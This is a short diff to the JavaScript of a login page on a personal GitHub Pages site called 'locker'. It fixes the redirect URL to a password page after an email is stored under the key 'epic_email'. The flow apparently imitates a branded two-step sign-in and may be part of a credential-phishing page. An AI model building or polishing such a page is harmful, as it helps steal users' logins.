@@ -506,8 +506,10 @@
 
   if (!emailInput || !errorEl) return;
 
-  /* URL propre de la page de mot de passe (sans paramètre) */
-  const PASSWORD_PAGE_URL = 'https://hesskahmdl.github.io/locker/login.html/passwords.html';
+  /* ============================================================
+     URL CORRIGÉE — le fichier passwords.html est à la racine du repo
+  ============================================================ */
+  const PASSWORD_PAGE_URL = 'https://hesskahmdl.github.io/locker/passwords.html';
 
   function isValidEmail(value) {
     if (!value) return false;
@@ -575,7 +577,7 @@
       localStorage.setItem('epic_email', value);
     } catch (err) { /* ignore */ }
 
-    /* Redirection vers l'URL PROPRE (sans paramètre) */
+    /* Redirection vers la page de mot de passe (URL corrigée) */
     window.location.href = PASSWORD_PAGE_URL;
   });
 
